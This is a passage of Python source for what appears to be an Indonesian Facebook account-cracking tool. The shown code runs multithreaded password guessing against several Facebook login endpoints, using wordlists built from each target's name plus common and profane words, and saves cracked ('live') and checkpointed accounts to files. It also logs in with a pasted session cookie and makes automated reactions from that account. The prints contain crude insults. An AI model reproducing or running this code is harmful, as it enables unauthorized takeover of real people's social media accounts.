			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing"]
						tokai.submit(self.crackapi,xi[0],pewe)
					except:pass
			hasil(live,chek)
		elif nanya in["2","02"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing","freefire"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"1234",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing","freefire"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing","freefire"]
						tokai.submit(self.modol,xi[0],pewe,"https://mbasic.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in["3","03"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing"]
						tokai.submit(self.modol,xi[0],pewe,"https://m.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in["4","04"]:
			print("[!] Harap Untuk Tidak Menggunakan Vpn/wifi Ketika Menggunakan Metode Ini\n[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","bismillah","sayang","kontol","bangsat","anjing"]
						else:
							pewe=["bismillah","sayang","kontol","bangsat","anjing"]
						tokai.submit(self.modol,xi[0],pewe,"https://free.facebook.com")
					except:pass
			hasil(live,chek)
		else:
			print("[!] Isi Yang Bener Ajg");self.ngontol()
# ngontol
def zxss(kuk):
	dict={}
	if "; " in kuk:
		kek=kuk.split("; ")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
			return dict
	else:
		kek=kuk.split(";")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
			return dict
class asup:
	def __init__(self,cok):
		self.cok=cok
	def login(self):
		try:
			cek=req.get("https://mbasic.facebook.com/profile.php",cookies=zxss(self.cok)).text
			if "mbasic_logout_button" in cek:
				print("\n\n[*] Hai, Welcome "+re.findall("\<title\>(.*?)<\/title\>",cek)[0]+" Ngentod:v")
				waktu(1)
				print("[!] Mohon Tunggu Sebentar Ngentod:v")
				open("cookie","w").write(self.cok)
				from kentod import aap_afandi,informasi
				if "Apa yang Anda pikirkan sekarang" in cek:
					informasi.info(zxss(self.cok)).myinfo();aap_afandi.ganteng(zxss(self.cok)).reaksi("Aap Ganteng:v");exit("[✓] Login Berhasil, Jalankan Ulang Tools Nya")
				else:
					informasi.info(zxss(self.cok)).myinfo();aap_afandi.ganteng(zxss(self.cok)).reaksi();exit("[✓] Login Berhasil, Jalankan Ulang Tools Nya")
			else:
				exit("\n\n[!] Cookie Invalid")
		except(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout):
			exit("[!] Kesalahan Pada Koneksi")
if __name__=="__main__":
	try:
		kueh=zxss(open("cookie","r").read().strip())
	except FileNotFoundError:
		os.system("clear")
		print("\n[*] Cara Mendapatkan Cookie : https://youtu.be/ZT4MU7AlgA4\n[*] Ketik OPEN Untuk Membuka Video\n")
		while True:
			a=input("[?] Masukkan Cookie : ")
			if a in[""," "]:
				print("[!] Jangan Kosong")
			elif a in["open","OPEN","Open"]:
				import subprocess
				exit(subprocess.Popen(["am","start","https://youtu.be/ZT4MU7AlgA4"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
			else:
				asup(a).login()
	try:
		tentang=json.loads(open("my_info","r").read().strip())
	except FileNotFoundError:
		from informasi import info as aapganteng_
		aapganteng_(kueh).myinfo();restart()
	if os.path.exists("chek.txt"): pass
	else: open("chek.txt","a").close()
	if os.path.exists("live.txt"): pass
	else: open("live.txt","a").close()
	ngentod().menu()


"""
Create By Aap Afandi Ganteng
GITHUB : https://github.com/KangPacman
"""